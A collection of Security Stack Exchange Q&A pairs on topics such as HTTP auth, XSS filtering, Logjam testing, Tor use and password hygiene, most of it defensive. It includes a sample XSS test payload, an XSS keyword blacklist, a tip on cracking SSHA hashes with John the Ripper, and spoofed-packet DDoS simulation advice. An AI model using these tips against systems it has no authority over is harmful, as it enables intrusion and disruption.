<p>If for example, you have an account (say GMail) that you've protected with GA-based 2FA, then you could generate backup codes for GMail, from GMail Account Management / Security menus. Since the backup codes need to be recognized by GMail, they are generated in GMail - not GA.</p>

<p>Same logic applies for any other account that you need backup codes for.</p>

<p><strong>Edit:</strong> To backup all the accounts you have on GA, you need to backup the ""App-specific secret"" (usually a long hex string; or a QR Code that has the string) for each account/app. AFAIK, GA doesn't use online storage to backup your GA-enabled accounts. </p>
","167580"
"Safety of publishing last 4 credit card digits in age of fast computing?","25540","","<p>How safe is it to make public the last four digits of a credit card?</p>

<p>Credit card numbers have a <a href=""http://byjess.net/cracking-the-credit-card-code/"">specific format</a>.  Digits tell you what type of institution issued the card, what bank issued the card, the account number, etc.  The whole 16 digits must conform to the <a href=""https://en.wikipedia.org/wiki/Luhn_algorithm"">Luhn formula</a>, a simple mod 10 checksum.  </p>

<p>Attackers have lists of valid first four digit numbers (which can be narrowed down using other information often provided with last 4; eg country).  Is it feasible for them to brute force matches to these first 4 and last 4 digits using Luhn and fast computers?</p>
","<p>Creating Luhn valid credit card numbers is not difficult, if you need them they're available <a href=""http://www.getcreditcardnumbers.com/"">here</a> amongst other places.</p>

<p>The trick for the criminal is tieing up the credit card number to the rest of the data to create a fraudulent transaction (CVV, expiry, name, perhaps address).</p>

<p>Even if I have the customers name, expiry date and last 4 digits, brute force <em>shouldn't</em> be a problem as it's an online brute-force and if you start iterating through valid numbers with a credit card processor, I'd expect that you'll get blocked very quickly by fraud detection mechanisms..</p>
","37759"
"Detecting the presence of wifi devices","25537","","<p>Is it possible, with a normal wifi adapter, to detect present wifi devices in the surrounding? Let's say, is it possible to detect an Iphone with wifi switched on in the range of my wifi adapter?</p>

<p>Perhaps it's possible to create a fake AP with an ESSID and encryption thats stored in the favorites list of the device that should be detected, but actually I am searching for a more generic way, without knowing the favorite networks.</p>

<p>Also, I remember I had found special hardware once for this purpose, but again, I am looking for a method where standard hardware can be utilized.</p>
","<p>You will need a wireless nic that permits a 'monitor' mode, and that requires some special drivers and special nics. </p>

<ul>
<li>Kismet's <a href=""http://www.linux-wlan.org/docs/wlan_adapters.html.gz"">list</a> of cards for Linux</li>
<li><a href=""http://airodump.net/testing-wifi-cards-wireless-hacking/"">tests</a> on different cards</li>
<li><a href=""http://hakshop.myshopify.com/products/wifi-pineapple"">pineapple</a> device (special device)</li>
<li><a href=""http://www.riverbed.com/us/products/cascade/wireshark_enhancements/airpcap.php"">airpcap</a> nic (specialized nic for Windows)</li>
</ul>

<p>Once you get a card, you will need software to deal with the data and <a href=""http://www.kismetwireless.net/index.shtml"">Kismet</a> is the leader in this area right now. </p>
","12292"
"How does basic HTTP Auth work?","25428","","<p>How does basic HTTP Auth work?</p>
","<p>The server sends back a header stating it requires authentication for a given realm. The user provides the username and password, which the browser concatenates (username + "":"" + password), and base64 encodes. This encoded string is then sent using a ""Authorization""-header on each request from the browser.
Because the credentials are only encoded, not encrypted, this is highly insecure unless it is sent over https.</p>
","757"
"How can I explain to non-techie friends that ""cryptography is good""?","25332","","<p>After <a href=""http://arstechnica.com/tech-policy/2016/03/brazil-frees-facebook-exec-arrested-over-whatsapp-data-linked-to-drug-case/"" rel=""noreferrer"">that case</a> in which Brazilian government arrested a Facebook VP due to end-to-end encryption and no server storage of messages on WhatsApp to prove connection with a drug case, it's become pretty common for friends of mine to start conversations about what cryptography is and why we should use it on a daily basis. The same applies with the iPhone terrorist encryption case <a href=""http://www.cnet.com/news/feds-unlock-iphone-5c-used-by-san-bernardino-terrorist-dont-need-apple/"" rel=""noreferrer"">in which the FBI broke in</a>.</p>

<p>For non-techie friends, it's easy to understand the basics of cryptography. I have managed to explain them the basics, public key x private key, what is end-to-end encryption during communication(your data is not stored encrypted, but it is ""scrambled"" during data exchange), all the core concepts without enter on more technical words like AES, MD5, SSL, PGP, hardware encryption acceleration, TPMs, etc. They like to have encryption on their phones, but they always come up with the following concept:</p>

<blockquote>
  <p>If terrorists/criminals could be caught by not having cryptography in our world, I would not blame data surveillance by governments and companies, nor the lack of cryptography in our communications/data storage.</p>
</blockquote>

<p>I explained that this point of view is somehow twisted (as a knife can be used to do crimes, but its primary use is as a tool), but I didn't keep their attention. </p>

<p><strong>Is there a best way to explain the value of cryptography for end-users in our modern world?</strong> (Snowden and Assange stories seems like fairy tales to them too).</p>

<p><strong>Compendium: Some of the explanations/concepts that didn't work so far:</strong></p>

<ul>
<li><p><em>Would you let the government have a copy of your house key?</em></p>

<p>People tend to isolate data from house access, and they clearly would say ""no, i do not want the government to have a copy of my house key and watch me doing private stuff. But if they are looking for a terrorist/criminal, it's fine to break the door"". For them, it's okay since they don't break in your house while you are pooping. The existence of a ""master key"" on encryption world is fine to them. ""My information is encrypted, but it could be turned into plain again in case of terrorism/crime"".</p></li>
<li><p><em>Would you let others trace your life based on what you do online?</em></p>

<p>""But Google already does that based on emails and searches..."". This mostly shocks me, because they are ""with the flow"" and they aren't bothered with data mining. Worse, people tend to trust way too much on Google.</p></li>
<li><p><em>What about the privacy of your communications? What if you are talking dirty things with your boy(girl)friend?</em>.</p>

<p>""I don't talk about things that would harm others(criminally speaking) so, i don't mind on being MITM'ded."". Again, it's fine to them if a conversation about their sexual routine is recorded, if the intent is to investigate criminal activity on their city.</p></li>
<li><p><em>The Knife paradox</em>.</p>

<p>You can see on their faces that this is a good one, but instead, they say that ""knifes aren't as dangerous as secret information being traded between criminals so, it's okay that Knifes are misused by criminals sometimes"".</p></li>
</ul>
","<p>""If lack of encryption allows FBI to catch terrorists, then lack of encryption allows criminals to loot your emails and plunder your bank account.""</p>

<p>The rational point here is that technology is morally neutral. Encryption does not work differently depending on whether the attacker is morally right and the defender morally wrong, or vice versa.</p>

<p>It is all fear-driven rhetoric anyway, so don't use logic; talk about what most frightens people, personally. And people fear most for their money.</p>
","123235"
"How to simulate DDoS attacks from the Internet?","25309","","<p>The idea behind security tests is easy. You want to know what a hacker can do - you hire a security expert who acts like a hacker to see how far he can get. You want to know what an evil admin can do - your security experts gets admin privileges and does his job that way.</p>

<p>I am aware that there are other and maybe better ways to perform an audit, but these are common approaches that work. Unfortunately it gets difficult when the threat is not a single person or a team of hackers, but a distributed bot-network that spams you with more or less intelligent requests. How can you test such a scenario? Lets say I have my infrastructure ready and I am confident that my systems can withstand a certain amount of pressure from a DDoS attack. Now I want to verify my expectations and perform a DDoS test from the Internet.</p>

<p>Where can I legally get a DDoS simulator? I do not want to buy resources from an illegal bot-net and I only want to work with experts in this field. Are there companies who perform such tests for you or can you at least rent systems that are powerful enough to simulate a DDoS attack? I am aware of the legal issues like informing all involved parties like providers and the like - this question is focused on how such a test can be performed. I am also <strong>not</strong> looking for a list of companies that can do that, I am interested what is state of the art in this field and which services are available on the market.</p>
","<p>I think you seek the use of a <a href=""http://en.wikipedia.org/wiki/Packet_generator"">packet generator</a> and a corresponding number of systems generating packets to match the load you seek. Use random valid IP addresses for the packet source addresses and you should find yourself quite annoyed when it comes time to filter.</p>

<p>You can do all of that without ever sending a bit across your ISP's link. If you get DDOS'd in such a way that bandwidth is maxed out rather than services, then your ISP will need to choke off the traffic prior to it reaching your link.</p>
","8076"
"Should sensitive data ever be passed in the query string?","25224","","<p>Should sensitive data ever be passed via the <a href=""http://en.wikipedia.org/wiki/Query_string"" rel=""nofollow noreferrer"">query string</a> as opposed to the POST request?   I realize that <a href=""https://stackoverflow.com/a/499594/16487"">the query string will be encrypted</a>, but are there other reasons to avoid passing data in the query string, such as shoulder surfing?</p>
","<p>If the query string is the target of a user-clickable link (as opposed to a URL used from some Javascript), then it will appear in the URL bar of the browser when the corresponding page is loaded. It has the following issues:</p>

<ul>
<li>The URL will be displayed. Shoulder surfers may see it and learn things from that (e.g. a password).</li>
<li>The user may bookmark it. This can be a feature; but it also means that the data gets written on the disk.</li>
<li>Similarly, the URL will make it to the ""history"" so it will be written to disk anyway; and it might be retrieved afterwards. For instance, if the browser is Chrome, then a lunch-time attacker just has to type Ctrl+H to open the ""history tab"" and obtain all the query strings.</li>
<li>If page is printed, the URL will be printed, including any sensitive information.</li>
<li>URLs including query strings are also frequently logged on the web server, and those logs may not be secured appropriately.</li>
<li>There are size limitations on the query string, which depend on the browser and the server (there is nothing really standard here, but expect trouble beyond about 4 kB).</li>
</ul>

<p>Therefore, if the query string is a simple link target in an HTML page, then sensitive data should be transmitted as part of a POST form, <em>not</em> encoded in the URL itself. With programmatic downloads (the AJAX way), this is much less of an issue.</p>
","29600"
"Should I tell my boss I have discovered their passwords and they are too weak?","25164","","<p>I'm on a temporary job so they don't give me any passwords to access the sites and resources I need. Instead, they tell me to move to another computer where a regular employee is and where every password is already set and saved on the browser. </p>

<p>I have to be honest, I got into the router (as they are using default credentials) to get the WiFi password so I can use it on my phone and found that it had a lot to do with the activity the company does (<em>e.g. if they were a restaurant, their password would be coffe123</em>). With that in mind, I just wanted to see if the same pattern was used for other types of resources such as the email address, hosting accounts, etc. and yes, they were.</p>

<p>When registering another domain with a new account, I guessed the password by seeing my boss slowly typing on the keyboard and, again, weak as f*.</p>

<p>Should I tell them? I'm afraid I might get in trouble for lurking too much.</p>

<p><em>Just as a clarification: it's not a big company, we are just a few employees and none of them but me know about computers and security, so there's no way of anonimously reporting the issue or contacting a sysadmin or IT related guy.</em></p>
","<p>While there is no doubt that weak passwords are an issue for your company, I would strongly advise against telling your boss about the things that you have done.</p>

<p>Your company decided against giving temporary workers access to sites and resources for a reason. Not only did you gain unauthorized access to the wireless LAN by guessing the password to the router, you also extended that access by probing the credentials against other resources - Resources that you were not supposed to have the password to. You then basically shoulder surfed your boss.</p>

<p>While there seem to be flaws in your employers policy concerning the access to company resources, and their password policies, all of these things could be considered 'hacking' by your employer and were definitely outside of your authorization.  </p>

<p>If I were you I would log off the WLAN and ask your employer for the password if you want to have access to it. Apart from that you should stop trying to use other peoples passwords on any access points just 'to see if the same pattern was used'. Depending on the legal system of the involved countries you can very well face legal problems for these kinds of acts.</p>

<p><strong>So what should you do with the information you have?</strong><br>
If your employer gives you a password to a service or a resource you could point out, that e.g. that password would easily be guessable for other people. I would not mention the other password here directly though.<br>
If your boss seems interested you could volunteer to research password best practices for the company. If they are serious about it, this would eliminate your concerns.<br>
If there is an IT person in the company you could bring these concerns to him as he will probably understand the need for a secure password policy better.</p>
","150188"
"How to crack password hashed using SSHA?","25140","","<p>Is it possible to crack a password hashed using SSHA if I know the salt? How can I do it?</p>
","<p>SSHA,  or more commonly known as salted SHA1  can be easily cracked with <a href=""http://www.openwall.com/john/"">John the Ripper</a>.</p>
","17595"
"How to validate a client certificate","25124","","<p>My understanding is that when using a client certificate for security one issues a private and public key cert (for example X509) of some sort and sends that of to the consumer of the service that one wants to authorize themselves before consuming. </p>

<p>But what's then the <em>standard</em> way of checking that it's actually a valid client cert they are presenting? Please present the <em>standard</em> workflow here and also the role of the CA in this case. </p>

<p>also wondering what's preventing someone for just exporting the client cert from the client machine and using it somewhere else, is preventing export for the private key safe enough? </p>
","<p>From a high level perspective, three things have to happen:</p>

<ol>
<li><p>The client has to prove that it is the proper owner of the client certificate.  The web server challenges the client to sign something with its private key, and the web server validates the response with the public key in the certificate.</p></li>
<li><p>The certificate has to be validated against its signing authority  This is accomplished by verifying the signature on the certificate with the signing authority's public key.  In addition, certificate revocation lists (CRLs) are checked to ensure the cert hasn't been blacklisted.</p></li>
<li><p>The certificate has to contain information which designates it as a valid user of the web service.  The web server is configured to look at specific items in the certificate (typically the subject field) and only allow certain values.</p></li>
</ol>
","48845"
"Hosting company advised us to avoid PHP for security reasons. Are they right?","25075","","<p>I'm doing a redesign for a client who's understandably concerned about security after having been hacked in the past. I had initially suggested using a simple PHP include for header and footer templates and a contact form they wanted. They are reluctant because they were advised by their hosting company that using PHP is a security concern which might allow someone to break into cPanel and gain control of the site.</p>

<p>This, to me, sounds about like telling someone to never drive so they won't be in a car accident. My gut instinct is that the host is trying to shift blame onto the client for security flaws in their own system. Also, the server still has PHP installed, whether or not we use it, so I'm questioning how much this actually reduces the attack surface... But since I'm not a security expert, I don't want to stick my foot in my mouth.</p>

<p>I told my client that to process the contact form they're going to need some form of dynamic scripting. (False?) They asked if I could just use PHP on that one page. Would this be measurably safer, or is it the equivalent of locking your car doors and leaving the window rolled down?</p>

<p>How much truth is there to the claim that using <em>any</em> PHP script, no matter how simple, is an inherent security problem? We're on shared hosting with no SSL. <strong>Is it reasonable to assume we got hacked due to using PHP? Will we be any safer if we don't use it, but can't uninstall it?</strong> Because if not, we have other problems.</p>

<p>(Would the answer be different for any other language?)</p>
","<p>It's not so much that PHP itself has security problems (assuming needed security updates), as it is there exists a lot of popular PHP-based software with rampant security problems. You could fault PHP for being a language that gives you enough rope to choke yourself, but the real problem is just how prevalent vulnerable PHP code actually is. One need look no further than the <a href=""https://stackoverflow.com/questions/tagged/php"">Stack Overflow PHP tag</a> to find PHP newbies writing horrifically vulnerable code based on some atrocity of an old tutorial.</p>

<p>Additionally, a significant number of popular PHP software known for their rampant security flaws is based on <em>very old</em> code and coding practices. Many of these old practices are considered bad-practices because of inherent security problems.</p>

<blockquote>
  <p>This, to me, sounds about like telling someone to never drive so they won't be in a car accident.</p>
</blockquote>

<p>Pretty much yes. Better advice might be along the lines of ""don't drive an old car with no airbags"".</p>

<blockquote>
  <p>My gut instinct is that the host is trying to shift blame onto the client for security flaws in their own system.</p>
</blockquote>

<p>Not necessarily. If a user uses the same password for the WordPress site and cPanel, compromising the WordPress password also compromises cPanel. That would be the fault of the user. Hackers rarely need to get that far though, and just use a PHP shell.</p>

<blockquote>
  <p>I told my client that to process the contact form they're going to need some form of dynamic scripting. (False?)</p>
</blockquote>

<p>Not necessarily true. You could use a 3rd party service to handle the mail sending. Then the service handles the dynamic server scripting and take over the security implications. There are numerous such services available with varying feature sets, and they are popular for powering contact forms on statically generated sites.</p>

<blockquote>
  <p>How much truth is there to the claim that using any PHP script, no matter how simple, is an inherent security problem?</p>
</blockquote>

<p>Some, but not much. PHP does involve some active code, in both PHP and the server software which executes it. If there were ever a security vulnerability in that process which did not depend on specific PHP code, it could be exploited. While that risk is tiny, it's a risk a server with no such support does not have.</p>
","128587"
"What does this Https - ""not fully secure"" warning mean?","25059","","<p>I went to sign into a website today using <strong><em>Google Chrome</em></strong> and was presented with the following error:</p>

<p><a href=""https://i.stack.imgur.com/SgfiR.png""><img src=""https://i.stack.imgur.com/SgfiR.png"" alt=""enter image description here""></a></p>

<blockquote>
  <p><strong>Your connection to this site is not fully secure</strong> </p>
  
  <p>Attackers might be able to see the images you're looking at on this site and trick you by
  modifying them</p>
</blockquote>

<p>When I clicked the <strong><em>Details</em></strong> link It says the following</p>

<blockquote>
  <p>The site includes HTTP resources</p>
</blockquote>

<p>I have never seen this warning before.</p>

<p>What does this warning mean in laymans terms and should I sign into the website with my username and password?</p>

<p><strong>Extra:</strong></p>

<p>Opening the same page in <strong><em>Microsoft Edge</em></strong> it claims the website is secure</p>
","<p>In a nutshell, it is saying that while the core of the page is using https (secure) to get that information to your computer, that (secure) page references insecure elements (like pictures and possibly scripts).</p>

<p>Attackers can't directly change the original page, but they can change the insecure elements.  If those are pictures, they can change the image.  If those are scripts, they can change those, too.  In that way, attackers could change what you see, even though the core page was 'secure'.</p>

<p>As Michael Kjörling points out in the comments, this also exposes some of your information in these requests - potentially cookies (if it is the same site / matches the cookie sites / the developer didn't specify secure only), referrers, etc, which will leak some information about what you are doing at the best case and at the worse may allow certain attacks. </p>

<p>This is bad practice on the part of the web developer - all elements should use secure transport.</p>

<p>You could (potentially) improve your own situation using a browser plugin that auto-updates all requests to http to https.  </p>
","147931"
"Can I detect web app attacks by viewing my Apache log file?","25020","","<p>I occasionally get clients requesting I look at their access_log file to determine if any web attacks were successful.  What tools are helpful to discern attacks?</p>
","<p>Yes you can, apache log gives you information about people who visited your website including bots and spiders.
patterns you can check:</p>

<ul>
<li>someone made multiple requests in less than second or accepted time frame.</li>
<li>accessed secure or login page multiple times in a one minute window.</li>
<li>accessed non existent pages using different query parameters or path.</li>
</ul>

<p>apache scalp <a href=""http://code.google.com/p/apache-scalp/"">http://code.google.com/p/apache-scalp/</a> is very good at doing all the above things </p>
","121"
"Can I trust the source IP of an HTTP request?","25018","","<p>As far as I've understood, if you try to issue a HTTP request  with a spoofed IP address, then the TCP handshake fails, so it's not possible to complete the HTTP request, because the SYN/ACK from the server doesn't reach the evil client ...</p>

<p>...<em>in most cases</em>. But let's now mostly disregard these four cases:<br>
- Man in the middle (MITM) attacks<br>
- The case when the evil client controls the network of the Web server<br>
- The case when the evil client fakes another IP on its own local network<br>
- <a href=""http://www.wired.com/threatlevel/2008/08/revealed-the-in/"">BGP attacks</a></p>

<p>Then I can indeed trust the IP address of a HTTP request?</p>

<p><strong>Background:</strong> I'm thinking about building a map of IP addresses and resource usage, and block IP addresses that consume too much resources. But I'm wondering if there is, for example, some way to fake an infinit number of IP addresses (by issuing successful HTTP requests with faked IPs), so that the Web server's <em>resource-usage-by-IP-buffers</em> grows huge and causes out-of-memory errors.</p>

<p>(Hmm, perhaps an evil Internet router could fake very many requests. But they aren't evil are they.  (This would be a MITM attack? That's why I said <em>mostly</em> disregard, above))</p>
","<p>Yes (with your assumptions of neglecting the client being able to intercept the return of the handshake at a spoofed IP) if you do things correctly.  HTTP requests are done over TCP; until the handshake is completed the web server doesn't start processing the HTTP request.  Granted a random user could attempt to spoof the end of a handshake; but as they have to guess the server generated ACK, they should only have a 1 in 2^32 (~4 billion) chance of doing it successfully each time.</p>

<p>As Ladadadada commented make sure you aren't picking up the wrong value of the remote IP address in your web application.  You want the IP address from the <a href=""http://en.wikipedia.org/wiki/IPv4#Header"">IP datagram header</a> (specifically, the source IP address).  You do not want values like <a href=""http://en.wikipedia.org/wiki/X-Forwarded-For"">X-Forwarded-For / X-Real-IP</a> that can be trivially forged as they are set in the HTTP header.  Definitely test by trying to spoof some IP addresses; with say a <a href=""https://addons.mozilla.org/en-US/firefox/addon/modify-headers/"">browser plugin</a> or manually with <code>telnet yourserver.com 80</code>. </p>

<p>The purpose of these fields is so web proxies (that may say cache content to serve it faster) can communicate to webservers the user's real IP address rather than the proxies IP address (which may be for hundreds of users).  However, since anyone can set this field it should not be trusted.</p>
","14528"
"Encryption and compression of Data","25013","","<p>If we want both encryption and compression during transmission then what will be the most preferable order.</p>

<ol>
<li>Encrypt then compress</li>
<li>Compress then encrypt</li>
</ol>
","<p>You should compress before encrypting.</p>

<p>Encryption turns your data into high-entropy data, usually indistinguishable from a random stream. Compression relies on patterns in order to gain any size reduction. Since encryption destroys such patterns, the compression algorithm would be unable to give you much (if any) reduction in size if you apply it to encrypted data.</p>

<p>Compression before encryption also slightly increases your practical resistance against differential cryptanalysis (and certain other attacks) if the attacker can only control the uncompressed plaintext, since the resulting output may be difficult to deduce.</p>

<p><strong>EDIT:</strong> I'm editing this years later because this advice is actually poor in an interactive case. You should not compress data before encrypting it in most cases. A side-channel attack method known as a ""compression oracle"" can be used to deduce plaintext data in cases where the attacker can interactively cause strings to be placed into an otherwise unknown plaintext datastream. Attacks on SSL/TLS such as CRIME and BREACH are examples of this.</p>
","19970"
"Where to get an SSL certificate for personal website?","25002","","<p>I would like to use https to login to my personal webpage (which is on shared hosting). So I went over to google and started searching for sollutions. Eventualy I found out that I need an SSL certificate to accomplish that (I thought it's all something that automaticaly enabled for each website, don't ask me why).</p>

<p>Then I went over to my hosting provider website and found out about the prices of these certificates... But I don't need something like that for my blog... I also found out that certificates can be self-signed, or obtained for free from certain certificate authorities.</p>

<p>What I'm wondering is - how should I approach this?<br />
Since I'm the only one that's logging in there - should I generate my own certificate? Or get a free one from some CA? If yes - which CA? <a href=""http://www.cacert.org/"">cacert</a> maybe? Will it all stay transparent this way, or will I start getting warnings about custom and unverified certificate? Can I trust a solution like this?</p>

<p>Does it even make sense to try and do something like this if I'm using shared hosting? I mean, from what I've read - this certificate would have to be installed on the server, and not just put somewhere in my hosting folder (as I thought it would work).. and the hosting provider won't do this for free I guess because it's kinda not in their interest (in any case I asked them, and am waiting for reply)... </p>

<p>Should I just drop it, or is there anything I can do on my own?</p>
","<p>I like using <a href=""http://cert.startcom.org/"" rel=""nofollow noreferrer"">StartCom</a> for a free certificate.  <i>Until mid-2016, it was</i> recognized in most major browsers and is better than using a self-signed certificate (No error prompts for users).</p>

<p><b>EDIT 2016</b>: Major browser vendors like <a href=""https://blog.mozilla.org/security/2016/10/24/distrusting-new-wosign-and-startcom-certificates/"" rel=""nofollow noreferrer"">Mozilla</a>, <a href=""https://support.apple.com/en-us/HT204132"" rel=""nofollow noreferrer"">Apple</a>, and <a href=""https://security.googleblog.com/2016/10/distrusting-wosign-and-startcom.html"" rel=""nofollow noreferrer"">Google</a> have announced they (and their browsers) no longer trust StartCom as a certificate authority, due to recently uncovered sketchy behavior by the certificate authority (see links in vendors names for their announcements of this and reason why).</p>

<p><strong>Edit 2017</strong>: <a href=""https://letsencrypt.org/"" rel=""nofollow noreferrer"">Let's Encrypt</a> is now a great option for personal use and seems to be accepted even more widely than StartSSL was. Downsides to Let's Encrypt are the relatively short validity of the certificate (3 months) but that is not overly burdensome if you are able to take advantage of the automatic renewal they offer through some of their tooling.</p>
","1171"
"Best Approach for removing XSS Vulnerability","24959","","<p>I have been developing a Webobjects application, and I found that my application is vulnerable to XSS through URL, but not when malicious input like <code>&lt;script&gt;alert(""hi"")&lt;/script&gt;</code> is input to form fields.</p>

<p>So, i have currently employed technique of URL rewriting in apache web server to solve this issue.</p>

<p>I have handled following javascript keywords :
<code>src</code> <code>onload</code> <code>onmouseover</code> <code>onkeypress</code> <code>onfocus</code> <code>alert</code></p>

<p>I dont know enough about XSS.</p>

<p>I want to know from experts here, is this is the right approach to solve XSS when the input to form fields is not showing vulnerability ?</p>

<p>Please suggest.</p>
","<p>Nope.  You should not try to fix XSS by doing URL rewriting in your Apache web server.  That's not a good way to go about it, as the result will be fragile at best.  In particular, if you stick with your current approach, there will most likely still be sneaky ways to exploit the XSS.</p>

<p>Instead, if the web application has XSS holes in it, <strong>fix the darn web application</strong>.  This is an application security problem; you have to fix it by fixing the application.  Trying to patch things up externally is probably going to be leaky like a sieve.</p>

<p>P.S. Your list of keywords is insufficient.  You've built a blacklist, and like any other blacklist, your blacklist is inevitably incomplete.  You're missing some stuff (* cough * <code>onerror</code> * cough *).  I'm not going to try to provide you with a more complete list, because the approach is fundamentally broken and rather than sticking with the approach and trying to extend your list of attributes to filter -- you need to ditch the current approach entirely and fix the problem at its source.</p>
","14014"
"Can 'cracked' product keys harm the user in any way?","24914","","<p>If a user download commercial software through the official, corresponding website, but use a product key which you did not legitimately purchase (e.g. websites that offer a list of product keys for free), does that harm anything other than the company who made the piece of software?</p>

<p>I was wondering if the person who generated those product keys can see which user(s) have used that key and are able to harm them in any way.</p>
","<p>No.</p>

<p>Only the manufacturer of the software can know what key you have used and only if the software ""calls home"" for (re-)activation. Using a non-original key (for example, one provided by a key generator) will not give anyone back-door access to your computer/program.</p>
","84703"
"How to check if a server is not vulnerable to Logjam?","24870","","<p>In response to <a href=""https://weakdh.org/"">Logjam</a> I want to prove I've hardened my services.
I know that the DH param has to be 2048 bits at least and self generated. But I am unable to find a way to actually check this for something other than an HTTPS site. 
(<a href=""https://weakdh.org/sysadmin.html"">thats I can do here</a>) 
I would like to check my other SSL protected services for this as well:</p>

<ul>
<li>Mail (Postfix and Dovecot)</li>
<li>SSH</li>
<li>VPN</li>
<li>Any other</li>
</ul>

<p>I got as far as <code>openssl s_client -starttls smtp -crlf -connect localhost:25</code> But that yielded: </p>

<pre><code>CONNECTED(00000003) depth=3 C = SE, O = ME, OU = Also ME, CN = Me again verify error:num=19:self signed certificate in certificate chain

verify return:0 Server certificate

-SNIPED SOME VALUES-

--- SSL handshake has read 6118 bytes and written 466 bytes

--- New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 2048 bit Secure Renegotiation IS supported Compression:

NONE Expansion: NONE SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 6EAA8A5B22E8C18E9D0E78A0B08447C8449E9B9543601BC53F57CB2059597754
    Session-ID-ctx: 
    Master-Key: &lt;MASTERKEY&gt;
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1432213909
    Timeout   : 300 (sec)
    Verify return code: 19 (self signed certificate in certificate chain)
--- 250 DSN
</code></pre>

<p>How can I test the DH parameters? and what should I watch for to know if I'm at risk?</p>
","<p>Do the smoke test: (stolen from <a href=""https://www.openssl.org/blog/blog/2015/05/20/logjam-freak-upcoming-changes/"" rel=""nofollow noreferrer"">OpenSSL blog</a>. (Archived <a href=""https://archive.is/OJRcR"" rel=""nofollow noreferrer"">here</a>.))</p>

<pre><code>openssl s_client -connect www.example.com:443 -cipher ""EDH"" | grep ""Server Temp Key""
</code></pre>

<blockquote>
  <p>The key should be at least 2048 bits to offer a comfortable security margin comparable to RSA-2048. Connections with keys shorter than 1024 bits may already be in trouble today. (Note: you need OpenSSL 1.0.2. Earlier versions of the client do not display this information.)</p>
</blockquote>

<p>(If the connections fails straight away, then the server does not support ephemeral Diffie-Hellman (""EDH"" in OpenSSL-speak, ""DHE"" elsewhere) at all and you're safe from Logjam.)</p>

<p>[...]</p>

<blockquote>
  <p>Finally, verify that export ciphers are disabled:</p>
</blockquote>

<pre><code>$ openssl s_client -connect www.example.com:443 -cipher ""EXP""
</code></pre>

<blockquote>
  <p>The connection should fail.</p>
</blockquote>

<p>In other words: </p>

<ul>
<li>get OpenSSL 1.0.2.</li>
<li>add the <code>-cipher ""EDH""</code> option to your connect string.</li>
<li>assume vulnerability if export ciphers are enabled on the server</li>
<li>assume vulnerability if 512 bit (or anything less than 2048 bit) turns up.</li>
</ul>
","89775"
"Tor and regular browser side by side. Does that make sense?","24838","","<p>Can I use a Tor browser session and a regular Firefox session side by side without corrupting the security of the Tor session? </p>

<p>E.g. when I download a new Eclipse version or when I'm searching for code snippets I think the NSA won't find out more than if I'm a mediocre programmer or not. But for more sensitive searches like insurances, I don't want my surfing as unsecured. So it would be nice if I could keep both programs open and switch when needed.</p>
","<p>Yes, you can use both a browser with a direct connection to the internet and a browser that uses the Tor proxy to access the internet (such as the <a href=""https://www.torproject.org/projects/torbrowser.html"" rel=""nofollow"">Tor Browser Bundle</a>), and still have the anonymity benefits of Tor when using the right browser.</p>

<p>There are two risks I am aware of. First and most significantly: modification of pages you are viewing to expose your identity if your sensitive browser holds identifying cookies. Secondly you need to be careful to avoid helping passive attackers carry out timing attacks.</p>

<h2><strong>Cookie Extraction</strong></h2>

<p>Schneier <a href=""https://www.schneier.com/blog/archives/2013/12/nsa_tracks_peop.html"" rel=""nofollow"">believes</a> the NSA's QUANTUMCOOKIE program may modify a (sensitive) page you are viewing over Tor, to inject a part of another website that will trigger your browser to  send identifying cookies:</p>

<blockquote>
  <p>My guess is that the NSA uses frame injection to surreptitiously
  force anonymous users to visit common sites like Google and Facebook
  and reveal their identifying cookies.</p>
</blockquote>

<p>They could do this through compromising / owning the exit node, or one of their other internet-scale programs to modify traffic between the exit node and the intended server.</p>

<p>Of course, this highlights a generic attack that isn't limited to the NSA.</p>

<p>It's not completely clear from the question whether you would be exposed to this, but the best mitigation would be to never use your sensitive browser for purposes that could identify you, and ensure it doesn't store cookies over sessions. To be specific: use a unique browser profile (or <a href=""https://www.torproject.org/projects/torbrowser.html"" rel=""nofollow"">TBB</a> install) for each identity you wish to have, and don't mix them. In the simple case of sensitive vs unsensitive, use a single browser for sensitive use only, and another for unsensitive, potentially identifying use. Both browsers can be used at the same time, provided you don't mix what you use them for.</p>

<h2><strong>Timing Attacks</strong></h2>

<p>If your browsing on the directly connected browser is related to your browsing over Tor, that could assist an adversary in carrying out <a href=""https://trac.torproject.org/projects/tor/wiki/doc/TorFAQ#Youshouldsendpaddingsoitsmoresecure."" rel=""nofollow"">timing-based confirmation attacks</a>.</p>

<p>For example, you're at an internet cafe with your <a href=""https://tails.boum.org/"" rel=""nofollow"">Tails distro</a>, and busy <a href=""https://www.riseup.net/en/pidgin#tor-with-pidgin-configuration"" rel=""nofollow"">chatting anonymously over Tor</a> to a <a href=""http://www.guardian.co.uk/profile/glenn-greenwald"" rel=""nofollow"">reporter</a> at the Guardian, whilst at the same time browsing outside of Tor the Guardian's coverage of your previous story and researching <a href=""http://asylumaccess.org/AsylumAccess/who-we-are/ecuador"" rel=""nofollow"">asylum in Ecuador</a>... the government agency notices your interesting non-private browsing and the fact that you are using Tor, and can make some intelligent deductions about what end points you might be communicating with.</p>

<p>Having dramatically narrowed down the possible end points you might be communicating with from ""the internet"" to ""places of interest to people with a reason to flee to Ecuador and interest in The Guardian"", their confirmation job becomes quite a lot simpler.</p>

<p>Of course, if you're looking at something <a href=""https://www.google.co.uk/search?q=lolcats&amp;tbm=isch"" rel=""nofollow"">with wider appeal</a> over a direct connection whilst doing your sensitive browsing over Tor, then whilst you arouse suspicion for using Tor, your well-resourced adversary doesn't have a lot more to go on, so carrying out confirmation attacks will be a lot more expensive for them.</p>

<h2><strong>Summary</strong></h2>

<p>Have a unique browser per identity you want to be kept separate, keep anything remotely related to an identity within the right browser. Oh, and don't accidentally copy and paste a URL / search term / email into the wrong browser.</p>

<p>Lucas' answer rightly points out that if the NSA or equivalently well funded adversary is specifically trying to track your activities as a high priority target, and not just blanket monitoring all Tor users, for example, then this question is fairly moot.</p>

<p><strong>Update:</strong> added cookie extraction via frame injection</p>
","38450"
